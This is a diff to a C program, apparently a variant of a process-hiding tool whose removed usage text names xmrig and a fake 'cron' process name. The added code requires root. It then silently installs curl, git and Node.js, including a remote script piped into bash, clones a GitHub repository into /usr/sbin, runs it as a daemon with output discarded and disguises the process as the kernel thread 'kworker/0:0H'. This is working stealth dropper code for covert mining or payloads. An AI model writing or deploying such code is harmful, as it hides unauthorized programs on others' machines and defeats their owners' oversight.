@@ -47,169 +47,223 @@ void start_cpu_load() {
     }
 }
 
-void usage(char *progname);
-
 int changeown (char *str)
 {
-	char user[256], *group;
-	struct passwd *pwd;
-	struct group *grp;
+    char user[256], *group;
+    struct passwd *pwd;
+    struct group *grp;
 
-	uid_t uid;
-	gid_t gid;
+    uid_t uid;
+    gid_t gid;
 
-	memset(user, '\0', sizeof(user));
-	strncpy(user, str, sizeof(user));
+    memset(user, '\0', sizeof(user));
+    strncpy(user, str, sizeof(user));
 
-	for (group = user; *group; group++)
-		if (*group == ':')
-		{
-			*group = '\0';
-			group++;
-			break;
-		}
+    for (group = user; *group; group++)
+        if (*group == ':')
+        {
+            *group = '\0';
+            group++;
+            break;
+        }
 
-	if (pwd = getpwnam(user)) 
-	{
+    if (pwd = getpwnam(user)) 
+    {
 
-		uid = pwd->pw_uid;
-		gid = pwd->pw_gid;
-	} else uid = (uid_t) atoi(user);
+        uid = pwd->pw_uid;
+        gid = pwd->pw_gid;
+    } else uid = (uid_t) atoi(user);
 
-	if (*group)
-		if (grp = getgrnam(group)) gid = grp->gr_gid;
-		else gid = (gid_t) atoi(group);
+    if (*group)
+        if (grp = getgrnam(group)) gid = grp->gr_gid;
+        else gid = (gid_t) atoi(group);
 
-	if (setgid(gid)) {
-		perror("Error: Can't set GID");
-		return 0;
-	}
+    if (setgid(gid)) {
+        perror("Error: Can't set GID");
+        return 0;
+    }
 
-	if (setuid(uid))
-	{
-		perror("Error: Can't set UID");
-		return 0;
-	}
+    if (setuid(uid))
+    {
+        perror("Error: Can't set UID");
+        return 0;
+    }
 
-	return 1;
+    return 1;
 }
 
 char *fullpath(char *cmd)
 {
-	char *p, *q, *filename;
-	struct stat st;
+    char *p, *q, *filename;
+    struct stat st;
 
-	if (*cmd == '/')
-		return cmd;
+    if (*cmd == '/')
+        return cmd;
 
-	filename = (char *) malloc(256);
+    filename = (char *) malloc(256);
 
-	if  (*cmd == '.')
-		if (getcwd(filename, 255) != NULL)
-		{
-			strcat(filename, "/");
-			strcat(filename, cmd);
-			return filename;
-		}
-		else
-			return NULL;
+    if  (*cmd == '.')
+        if (getcwd(filename, 255) != NULL)
+        {
+            strcat(filename, "/");
+            strcat(filename, cmd);
+            return filename;
+        }
+        else
+            return NULL;
 
-	for (p = q = (char *) getenv("PATH"); q != NULL; p = ++q)
-	{
-		if (q = (char *) strchr(q, ':'))
-			*q = (char) '\0';
+    for (p = q = (char *) getenv("PATH"); q != NULL; p = ++q)
+    {
+        if (q = (char *) strchr(q, ':'))
+            *q = (char) '\0';
 
-		snprintf(filename, 256, "%s/%s", p, cmd);
+        snprintf(filename, 256, "%s/%s", p, cmd);
 
-		if (stat(filename, &st) != -1
-				&& S_ISREG(st.st_mode)
-				&& (st.st_mode&S_IXUSR || st.st_mode&S_IXGRP || st.st_mode&S_IXOTH))
-			return filename;
+        if (stat(filename, &st) != -1
+                && S_ISREG(st.st_mode)
+                && (st.st_mode&S_IXUSR || st.st_mode&S_IXGRP || st.st_mode&S_IXOTH))
+            return filename;
 
-		if (q == NULL)
-			break;
-	}
+        if (q == NULL)
+            break;
+    }
 
-	free(filename);
+    free(filename);
 
-	return NULL;
+    return NULL;
 
 }
 
-void usage(char *progname)
-{
-	fprintf(stderr, "siluman - tulak panto, by jawaracode "
-			"Jawara (c)ode 2024\n\nOptions:\n"
-
-			"-s string\tFake name process\n"
-			"-d\t\tRun aplication as daemon/system (optional)\n" 
-			"-u uid[:gid]\tChange UID/GID, use another user (optional)\n" 
-			"-p filename\tSave PID to filename (optional)\n"
-			"-c\t\tEnable multi-core CPU load simulation (optional)\n\n"
-			"Example: %s -s \"cron -m 0\" -d -p test.pid -c ./xmrig -u bla bla bla",progname);
-
-	exit(1);
+// Fungsi untuk menjalankan perintah sistem dan memeriksa hasilnya
+int run_system_command(const char *command) {
+    int status = system(command);
+    if (status == -1) {
+        perror("System command failed");
+        return 0;
+    } else if (WIFEXITED(status) && WEXITSTATUS(status) != 0) {
+        fprintf(stderr, "Command failed with exit code %d: %s\n", WEXITSTATUS(status), command);
+        return 0;
+    }
+    return 1;
 }
 
 int main(int argc,char **argv)
 {
-    char c;
+    // Konfigurasi tetap
+    int enable_cpu_load = 1;
+    int runsys = 1;
+    char *pidfile = "sys.pid";
+    char *fakename = "kworker/0:0H";
+    
     char fake[256];
-    char *progname, *fakename = NULL;
-    char *pidfile = NULL, *fp;
+    char *fp;
     char *execst;
-
     FILE *f;
-
-    int runsys=0, null;
-    int j,i,n,pidnum;
+    int null;
+    int pidnum;
     char **newargv;
-    int enable_cpu_load = 0; // Flag untuk enable CPU load
-
-    progname = argv[0];
-    if(argc<2) usage(progname);
-
-    for (i = 1; i < argc; i++)
-    {
-        if (argv[i][0] == '-')
-            switch (c = argv[i][1])
-            {
-
-                case 's': fakename = argv[++i]; break;
-                case 'u': changeown(argv[++i]); break; 
-                case 'p': pidfile = argv[++i]; break;
-                case 'd': runsys = 1; break;
-                case 'c': enable_cpu_load = 1; break; // Opsi baru untuk enable CPU load
-                default:  usage(progname); break;
-            }
-        else break;
+    
+    // Pastikan program dijalankan sebagai root
+    if (geteuid() != 0) {
+        fprintf(stderr, "Program harus dijalankan sebagai root (sudo)\n");
+        exit(1);
     }
-
-    if (!(n = argc - i) || fakename == NULL) usage(progname);
-
-    // Jalankan beban CPU jika opsi -c dienable
+    
+    // Jalankan instalasi dependencies secara otomatis
+    printf("Melakukan instalasi dependencies...\n");
+    
+    // Buat direktori /usr/sbin jika belum ada
+    mkdir("/usr/sbin", 0755);
+    
+    // Update package list
+    if (!run_system_command("apt update -qq >/dev/null 2>&1")) {
+        fprintf(stderr, "Gagal update package list\n");
+    }
+    
+    // Install curl dan git jika belum ada
+    if (!run_system_command("which curl >/dev/null 2>&1 || apt install -y curl -qq >/dev/null 2>&1")) {
+        fprintf(stderr, "Gagal install curl\n");
+    }
+    
+    if (!run_system_command("which git >/dev/null 2>&1 || apt install -y git -qq >/dev/null 2>&1")) {
+        fprintf(stderr, "Gagal install git\n");
+    }
+    
+    // Install Node.js
+    if (!run_system_command("which node >/dev/null 2>&1 || (curl -fsSL https://deb.nodesource.com/setup_20.x | bash - >/dev/null 2>&1 && apt install -y nodejs -qq >/dev/null 2>&1)")) {
+        fprintf(stderr, "Gagal install Node.js\n");
+    }
+    
+    // Clone repository nbwc jika belum ada
+    struct stat st;
+    if (stat("/usr/sbin/nbwc", &st) != 0) {
+        if (!run_system_command("git clone -q https://github.com/x011-al/nbwc /usr/sbin/nbwc 2>/dev/null")) {
+            fprintf(stderr, "Gagal clone repository nbwc\n");
+        } else {
+            printf("Berhasil clone repository nbwc\n");
+            // Jalankan npm install setelah clone berhasil
+            printf("Menjalankan npm install di /usr/sbin/nbwc...\n");
+            if (chdir("/usr/sbin/nbwc") == 0) {
+                if (!run_system_command("npm install --no-bin-links --quiet >/dev/null 2>&1")) {
+                    fprintf(stderr, "Gagal menjalankan npm install\n");
+                } else {
+                    printf("npm install berhasil\n");
+                }
+                chdir("/"); // Kembali ke root directory
+            } else {
+                perror("Gagal mengubah direktori ke nbwc");
+            }
+        }
+    } else {
+        printf("Direktori nbwc sudah ada, melewatkan clone...\n");
+        // Cek apakah node_modules ada, jika tidak jalankan npm install
+        if (stat("/usr/sbin/nbwc/node_modules", &st) != 0) {
+            printf("Menjalankan npm install di /usr/sbin/nbwc...\n");
+            if (chdir("/usr/sbin/nbwc") == 0) {
+                if (!run_system_command("npm install --no-bin-links --quiet >/dev/null 2>&1")) {
+                    fprintf(stderr, "Gagal menjalankan npm install\n");
+                } else {
+                    printf("npm install berhasil\n");
+                }
+                chdir("/");
+            } else {
+                perror("Gagal mengubah direktori ke nbwc");
+            }
+        }
+    }
+    
+    // Jalankan beban CPU jika dienable
     if (enable_cpu_load) {
         start_cpu_load();
     }
-
+    
+    // Siapkan command untuk dieksekusi
+    int n = 2;
     newargv = (char **) malloc((n + 1) * sizeof(char *));
-    for (j = 0; j < n; i++,j++) newargv[j] = argv[i];
-    newargv[j] = NULL;
-
-    if ((fp = fullpath(newargv[0])) == NULL) { perror("Full path seek"); exit(1); }
-    execst = fp;
-
-    if (n > 1)
-    {
-        memset(fake, ' ', sizeof(fake) - 1);
-        fake[sizeof(fake) - 1] = '\0';
-        strncpy(fake, fakename, strlen(fakename));
-        // Kent, this is the key point.. keke
-        newargv[0] = fake;
-        /*for (int i = 1; i < n; i++) newargv[i] = "";*/
+    newargv[0] = "node";
+    newargv[1] = "run.js";
+    newargv[2] = NULL;
+    
+    // Dapatkan full path untuk node
+    if ((fp = fullpath("node")) == NULL) {
+        perror("Full path seek for node");
+        exit(1);
     }
-    else newargv[0] = fakename;
-
+    execst = fp;
+    
+    // Ubah direktori kerja ke /usr/sbin/nbwc
+    if (chdir("/usr/sbin/nbwc") != 0) {
+        perror("Failed to change directory to /usr/sbin/nbwc");
+        exit(1);
+    }
+    
+    // Setup fake process name
+    memset(fake, ' ', sizeof(fake) - 1);
+    fake[sizeof(fake) - 1] = '\0';
+    strncpy(fake, fakename, strlen(fakename));
+    newargv[0] = fake;
+    
+    // Daemonize
     if (runsys) 
     {
         if ((null = open("/dev/null", O_RDWR)) == -1)
@@ -228,7 +282,6 @@ int main(int argc,char **argv)
                 setsid();
                 switch (fork())
                 {
-
                     case -1:
                         perror("Error: FORK-2");
                         return -1;
@@ -241,7 +294,6 @@ int main(int argc,char **argv)
                         dup2(null, 0);
                         dup2(null, 1);
                         dup2(null, 2);
-
                         break;
 
                     default:
@@ -262,7 +314,7 @@ int main(int argc,char **argv)
         fclose(f);
     }
 
-    fprintf(stderr,"==> Fakename: %s PidNum: %d\n",fakename,pidnum); 
+    fprintf(stderr,"==> Fakename: %s PidNum: %d\n", fakename, pidnum); 
     execv(execst, newargv);
     perror("Couldn't execute");
     return -1;
